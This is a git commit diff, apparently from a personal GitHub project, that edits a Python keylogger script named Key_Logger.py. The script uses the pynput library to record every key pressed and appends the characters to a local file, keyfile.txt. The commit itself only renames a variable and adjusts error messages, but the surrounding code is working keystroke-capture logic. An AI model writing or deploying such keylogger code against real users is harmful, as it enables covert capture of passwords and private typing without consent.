1152a1e2145eafe4253dab255e7d4e5bd46ab507
Ltracy97 <112230968+Ltracy97@users.noreply.github.com>
2022-11-09 09:15:26 -0600

    Add files via upload

--- KeyLogger/Key_Logger.py
+++ KeyLogger/Key_Logger.py
@@ -2,13 +2,12 @@ from pynput import keyboard
 
 
 def Pressed(key):
-    print(str(key))
     with open("keyfile.txt", 'a') as logKey:
         try:
-            char = key.char
-            logKey.write(char)
+            chara = key.char
+            logKey.write(chara)
         except:
-            print("Error getting char")
+            print("Error getting character")
 
 
 if __name__ == "__main__":
